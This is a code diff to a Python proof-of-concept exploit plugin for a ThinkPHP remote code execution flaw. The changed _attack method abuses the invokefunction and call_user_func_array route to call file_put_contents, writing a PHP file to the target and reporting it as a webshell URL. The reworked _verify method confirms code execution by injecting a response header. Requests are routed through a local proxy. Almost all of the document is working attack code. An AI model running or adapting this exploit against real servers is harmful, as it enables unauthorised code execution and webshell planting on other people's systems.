@@ -29,20 +29,26 @@ class ThinkPHP(POCBase):
     def _attack(self):
             result = {}
             shell_name = str(int(random.random() * 1000))+'.php'
-            shell_code = '<?php%20phpinfo();?>'
-            vul_url = '%s/?s=index/\\think\\template\driver\\file/write&cacheFile=%s&content=%s' % (self.url,shell_name,shell_code)
+            shell_code = '<?php phpinfo();?>'
+            proxies = {
+                "http": "http://127.0.0.1:8081"
+            }
+            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=%s&vars[1][]=%s' % (self.url,shell_name,shell_code)
             if not self._verify(verify=False):
                 return self.parse_attack(result)
-            response = req.post(vul_url)
-            if response.status_code == 200:
+            response = req.post(vul_url,proxies=proxies)
+            if response.status_code == 200 and str(len(shell_code)) in response.content:
                 result['webshell'] = self.url+shell_name
             return self.parse_attack(result)
 
     def _verify(self,verify=True):
             result = {}
-            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=1024' % self.url
-            response = req.get(vul_url).content
-            if '1024' in response:
+            proxies = {
+                "http":"http://127.0.0.1:8081"
+            }
+            vul_url = '%s/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]=vuln:1' % self.url
+            response = req.get(vul_url,proxies=proxies).headers
+            if 'vuln' in response:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = self.url
             return self.parse_attack(result)
